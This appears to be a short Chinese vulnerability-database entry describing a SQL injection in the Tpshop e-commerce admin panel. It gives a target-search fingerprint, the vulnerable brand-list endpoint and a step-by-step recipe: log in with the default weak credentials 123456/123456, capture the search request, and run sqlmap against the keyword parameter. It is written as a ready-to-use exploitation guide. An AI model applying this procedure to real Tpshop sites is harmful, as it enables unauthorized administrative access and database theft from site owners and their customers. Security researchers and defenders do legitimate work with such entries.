# Tpshop后台sql注入漏洞

- **系统**：Tpshop　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app=”Tpshop”`
- **请求**：`POST /index.php/Admin/Goods/brandList HTTP/1.1`

**请求体 / payload**
```
首先访问后台登录页面
/index.php/Admin/Admin/login
通过默认账户弱口令进行登录
123456/123456
/index.php/Admin/Goods/brandList
访问品牌列表处
在搜索处，抓取数据包
对keyword参数使用sqlmap进行测试
存在漏洞
Sql.txt内容如下
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 153
Priority: u=1
keyword=1
```